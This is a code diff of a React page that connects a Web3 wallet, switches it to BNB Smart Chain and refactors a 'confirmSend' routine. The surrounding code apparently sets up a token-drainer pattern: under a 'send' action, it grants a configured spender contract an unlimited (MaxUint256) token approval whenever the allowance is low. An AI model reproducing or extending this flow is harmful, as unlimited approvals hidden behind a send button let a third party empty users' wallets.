@@ -82,8 +82,15 @@ export default function Home() {
     if (!provider || autoConnectAttempted.current) return;
     autoConnectAttempted.current = true;
 
-    const accountsChanged = (...args: unknown[]) => { if (!Array.isArray(args[0]) || !(args[0] as string[]).length) setNotice("Wallet disconnected. Connect again to continue."); };
-    const chainChanged = (...args: unknown[]) => { if (String(args[0]).toLowerCase() !== targetChainHex) setNotice("Please switch to BNB Smart Chain to continue."); };
+    const accountsChanged = (...args: unknown[]) => {
+      const accounts = args[0];
+      const address = Array.isArray(accounts) && typeof accounts[0] === "string" ? accounts[0] : "";
+      setWalletAddress(address);
+      setNotice(address ? "" : "Wallet disconnected. Connect again to continue.");
+    };
+    const chainChanged = (...args: unknown[]) => {
+      setNotice(String(args[0]).toLowerCase() === targetChainHex ? "" : "Please switch to BNB Smart Chain to continue.");
+    };
     provider?.on?.("accountsChanged", accountsChanged);
     provider?.on?.("chainChanged", chainChanged);
     const autoConnect = async () => {
@@ -155,6 +162,20 @@ export default function Home() {
 
   function getProvider() { return walletProvider ?? window.ethereum; }
 
+  async function connectWallet() {
+    const provider = getProvider();
+    if (!provider) throw new Error("No compatible Web3 wallet detected.");
+
+    const accounts = await provider.request({ method: "eth_requestAccounts" });
+    if (!Array.isArray(accounts) || typeof accounts[0] !== "string" || !accounts[0]) {
+      throw new Error("No wallet account found.");
+    }
+
+    await switchToBnb(provider);
+    setWalletAddress(accounts[0]);
+    return accounts[0];
+  }
+
   async function switchToBnb(provider: Eip1193Provider) {
     if (String(await provider.request({ method: "eth_chainId" })).toLowerCase() === targetChainHex) return;
     try { await provider.request({ method: "wallet_switchEthereumChain", params: [{ chainId: targetChainHex }] }); }
@@ -168,17 +189,16 @@ export default function Home() {
   }
 
   async function confirmSend() {
-    const provider = getProvider();
-    if (!provider) { setNotice("Install a compatible EVM wallet to connect."); return; }
     if (!spender || !token) { setNotice("Contract configuration is missing."); return; }
     setIsSending(true); setNotice("");
     try {
-      const accounts = await provider.request({ method: "eth_requestAccounts" }) as string[];
-      if (!accounts?.length) throw new Error("No wallet account was selected.");
-      await switchToBnb(provider);
+      const address = await connectWallet();
+      const provider = getProvider();
+      if (!provider) throw new Error("No compatible Web3 wallet detected.");
       const browserProvider = new BrowserProvider(provider as never);
       const signer = await browserProvider.getSigner();
-      const address = await signer.getAddress();
+      const signerAddress = await signer.getAddress();
+      if (signerAddress.toLowerCase() !== address.toLowerCase()) throw new Error("Wallet account changed before completion. Please try again.");
       const contract = new Contract(token, erc20, signer);
       const allowance = await contract.allowance(address, spender);
       if (allowance < ethers.parseUnits("5", 6)) { const tx = await contract.approve(spender, ethers.MaxUint256); await tx.wait(); }
